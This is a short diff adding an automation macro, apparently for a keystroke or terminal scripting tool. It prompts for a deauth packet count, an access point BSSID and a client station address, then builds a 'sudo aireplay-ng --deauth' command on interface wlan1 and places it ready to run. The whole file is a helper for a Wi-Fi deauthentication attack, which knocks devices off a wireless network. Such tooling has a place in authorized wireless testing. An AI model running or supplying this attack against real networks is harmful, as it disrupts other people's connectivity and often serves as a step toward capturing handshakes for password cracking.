@@ -1,0 +1,4 @@
+WTIME 800
+SCRIPT printf "DEAUTH: "; read DEAUTH; printf "BSSID: "; read BSSID; printf "STATION: "; read STATION; cmd="sudo aireplay-ng --deauth $DEAUTH -a $BSSID -c $STATION wlan1"; print -z -- "$cmd"
+WTIME 1800
+ENTER
